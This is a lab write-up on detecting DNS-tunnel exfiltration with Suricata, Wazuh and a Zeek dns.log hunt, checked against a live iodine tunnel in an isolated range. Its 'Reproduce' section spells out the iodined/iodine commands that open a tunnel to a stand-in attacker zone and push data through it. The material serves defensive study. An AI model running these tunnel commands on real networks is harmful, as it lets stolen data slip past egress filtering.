# DNS tunneling — detecting exfiltration over DNS (Zeek + Suricata)

**Phase 6 — NSM.** DNS is the exfil channel of last resort that almost always works: outbound DNS is
permitted on nearly every network (it has to be, for anything to resolve), so an implant that encodes stolen
data into the **subdomain labels** of an attacker-controlled zone walks straight past egress filtering that
would block a direct connection. This is **T1071.004** (Application Layer Protocol: DNS) / **T1048.003**
(Exfiltration Over Alternative Protocol). The good news for the defender: the technique can't hide its
*shape*. This lab detects it two ways from the wire — a real-time Suricata rule and a quantitative Zeek
`dns.log` hunt — and verifies both against a live [iodine](https://github.com/yarrick/iodine) tunnel.

> [!check] Executed and verified live on 2026-09-05.
> An `iodine` DNS tunnel from `fs-01` (CORP) to `atk-01` (REDTEAM) carried real traffic (a file exfil + 60
> pings, 0% loss) as DNS. Zeek logged **360 queries to one zone, 100% of them unique, mean name length 127
> chars (max 681)** — normal DNS names are under 40. The `hunt-dns-tunnel.py` analytic scored that zone **94**
> and everything else in single digits; the Suricata rule (**9100010**) fired **100×** on the live traffic.

---

## The scenario, and why the traffic is where the sensor can see it

Same design logic as the [Sliver C2 exercise](../phase-5-offense/sliver-c2/README.md): the sensor (Suricata +
Zeek) is inline on `rtr-01`'s **CORP** interface, so the tunnel has to cross that link to be seen.

- **Egress is modeled, not faked.** The default-deny firewall had no CORP→REDTEAM DNS path. One tightly-scoped
  rule was added — `CORP → REDTEAM:53 (udp/tcp)` — which models the reality the technique abuses: **outbound
  DNS is almost always allowed.** REDTEAM stands in for attacker-controlled internet infrastructure hosting
  the authoritative tunnel zone. The rule is in `roles/router/files/nftables.conf` (IaC-tracked), right next
  to the web-egress rule the Sliver beacon uses, and routes the tunnel across the monitored CORP interface.
- **Attacker:** `atk-01` runs `iodined`, authoritative for the tunnel zone `t.exfil-lab.net`. **Victim:**
  `fs-01` runs the `iodine` client in direct mode. Data sent through the tunnel (a simulated file exfil, then
  a ping flood) is encoded into query names and streamed to the zone.

```
  fs-01 (CORP 10.10.10.20)  ── DNS queries: <encoded-data>.t.exfil-lab.net ──▶  atk-01 (REDTEAM :53, iodined)
        [iodine client]                    │
                                           ▼
                              rtr-01 CORP iface  [Zeek dns.log + Suricata]  ◀── caught here
```

---

## What the wire showed

Zeek's `dns.log` made the tunnel obvious — the query names are enormous and never repeat:

```
len  rcode    query
681  NOERROR  rcyad\xe4\xd9z...<600+ chars of encoded labels>...t.exfil-lab.net
678  NOERROR  rdfed\xea\xd9b...t.exfil-lab.net
621  NOERROR  1qbad82\xcf\xd3...t.exfil-lab.net
...  158 of 200 dns.log entries were queries to this one zone
```

The tunnel's answered queries are `NOERROR` (iodined resolves them), not `NXDOMAIN — an established tunnel
doesn't rely on missing names, so **name length and uniqueness, not NXDOMAIN ratio, are the signal here**
(NXDOMAIN bursts matter more for tools that probe unregistered lookups; the hunt reports it either way).

---

## Detection 1 — real-time (Suricata rule 9100010)

Added to `roles/router/files/suricata-local.rules`, the NSM companion to the Sliver rules:

```
alert dns $HOME_NET any -> 10.10.40.0/24 53 (msg:"LAB DNS tunneling - long encoded query names to REDTEAM
   (T1071.004 / T1048.003)"; dns.query; pcre:"/^.{100}/";
   detection_filter:track by_src, count 20, seconds 60; classtype:data-theft; sid:9100010; rev:2; ...)
```

Two conditions, deliberately combined:
- **`dns.query; pcre:"/^.{100}/"`** — the query name is ≥ 100 chars. A single legitimate name occasionally
  gets long (some CDN/DKIM records), but 100+ is already abnormal and a tunnel's run to many hundreds.
- **`detection_filter: 20 in 60s per source`** — so one odd long lookup never alerts; only a *sustained
  stream* of them from one host does. That's what turns a noisy length heuristic into a precise tunnel signal.

Encoding-agnostic (it matches the shape, not iodine's specific codec) and scoped to REDTEAM:53, mirroring the
beacon rules. **Verified firing on the live tunnel: 100 alerts,** all `10.10.10.20 → 10.10.40.119:53`.

> [!warning] Gap found and fixed 2026-09-07 — this alone never reached the SOC.
> Running the end-to-end capstone (`apt-scenario/run-scenario.sh`) for real surfaced something the 2026-09-05
> exercise never checked: **9100010 is a Suricata sid, not a Wazuh rule.** It fires correctly in Suricata's own
> `eve.json` on `rtr-01` (confirmed again live: 126 hits), but nothing ever turned it into a labeled Wazuh
> alert — unlike the T1190 web attack, which got its own rule (100440) as a child of the stock Suricata rule
> 86601. A fresh live tunnel (60 pings, 0% loss) proved it: the only thing that showed up in
> `siem-01`'s `alerts.json` was the generic threat-intel CDB hit (rule 100210, "known-bad dest IP"), and only
> because atk-01's IP happens to already be blocklisted from unrelated exercises. Remove that coincidence and
> **DNS tunneling would have been completely invisible to the SIEM** — caught only by a human tailing
> `eve.json` on the sensor box itself, which defeats the point of having a SIEM. See Detection 1b, below.

## Detection 1b — the Wazuh rule the SOC actually sees (100443)

`roles/siem/files/local_rules.xml`, built the same way 100440 (T1190) was — a child of the stock Suricata
rule 86601, keyed on the signature text rather than re-parsing the sid:

```xml
<rule id="100443" level="13">
  <if_sid>86601</if_sid>
  <field name="alert.signature" type="pcre2">LAB DNS tunneling</field>
  <description>DNS tunneling to REDTEAM — long encoded query names ($(alert.signature))</description>
  <mitre><id>T1048.003</id><id>T1071.004</id></mitre>
</rule>
```

Level 13, not 12, on purpose — 100210/100211 (the generic threat-intel CDB rules) are also children of 86601
at level 12, and Wazuh's same-event precedence picks the *highest-level matching sibling*, not "all of them."
A tie or a loss there means the labeled DNS-tunneling alert never surfaces, just the generic one — the exact
bug already found and fixed for 100440 (see [`detection-catalog.md`](../phase-4-detection/detection-catalog.md)
row #38). **Verified live:** re-ran the tunnel after deploying this rule — `firedtimes:100` on the very next
burst of 60 pings.

## Detection 2 — the hunt (`hunt-dns-tunnel.py`, Zeek `dns.log`)

The analyst's quantitative view, and the more robust one — it works on *any* destination, not just the scoped
REDTEAM one, and it explains *why* a domain is suspicious. It groups `dns.log` by registrable base domain and
scores each on the three things a tunnel can't avoid: long names, near-total uniqueness, high entropy.

```
== DNS-tunnel hunt :: 444 queries, 6 base domains, 4 with >=10 queries ==
    score queries  uniq% mean_len max_len entropy   nx%  domain
  -----------------------------------------------------------------------
  !    94     360   100%     127c    681c    3.54    0%  exfil-lab.net
       29      20    15%      33c     44c    3.65    0%  _tcp.local
        3      27     4%       5c      5c    0.00    0%  DC-01
        2      27     4%       3c      3c    0.00    0%  LAB
```

The tunnel domain isn't a close call — it's **100% unique names** (every query is distinct encoded data, where
normal DNS reuses a handful of hostnames) at a **mean 127 / max 681 chars** against everything else's 3–33.
Rarity + length + uniqueness put it at 94 while normal internal DNS sits at 2–29. This is the same
hunt→detection pairing as [Phase-4 threat hunting](../phase-4-detection/threat-hunting/README.md): a hunt
that quantifies the behaviour, and a deployed rule that catches it live.

---

## The takeaway

**DNS tunneling defeats egress filtering precisely because DNS is allowed out — and it is caught anyway,
because the encoded traffic looks nothing like real DNS.** Length, uniqueness, and volume to a single zone are
signals no encoding can suppress. Honest limitations, documented rather than hidden:

- **The length threshold is a heuristic.** A tunnel using short queries and a low request rate (trading
  bandwidth for stealth) would push the mean length down; the volume filter and the uniqueness signal are the
  backstops, and a determined low-and-slow tunnel is a known hard case for any single rule (the real answer is
  baselining per-domain query behaviour over time).
- **NXDOMAIN isn't the signal for an *established* tunnel** (iodined answers `NOERROR`); it's more useful
  against tools that brute unregistered names. The hunt reports it so the analyst sees when it *does* apply.
- Fills the **Exfiltration** tactic (T1048.003) and adds **T1071.004**; coverage map now 41 techniques.

## Reproduce

```bash
# attacker (atk-01): authoritative tunnel server
iodined -f -c -P <pass> 10.8.0.1 t.exfil-lab.net

# victim (fs-01, CORP): client in direct mode (needs CORP->REDTEAM:53, in the router role)
iodine -f -r -P <pass> 10.10.40.119 t.exfil-lab.net
ping -c 60 -i 0.1 10.8.0.1                       # push data through the tunnel

# defender: the hunt + the wire-level rule + the SOC-visible rule
./hunt-dns-tunnel.py                                                   # ranks exfil-lab.net #1
ssh rtr-01 "grep -ac '\"signature_id\":9100010' /var/log/suricata/eve.json"   # Suricata's own view
ssh siem-01 "sudo grep -a '\"id\":\"100443\"' /var/ossec/logs/alerts/alerts.json | tail"  # the SOC's view
```

Rule: [`roles/router/files/suricata-local.rules`](../phase-7-automation/ansible/roles/router/files/suricata-local.rules)
(sid 9100010, the wire-level Suricata signature) → [`roles/siem/files/local_rules.xml`](../phase-7-automation/ansible/roles/siem/files/local_rules.xml)
(rule 100443, the labeled Wazuh alert an analyst would actually see) · egress model: `roles/router/files/nftables.conf` · hunt:
[`hunt-dns-tunnel.py`](hunt-dns-tunnel.py).
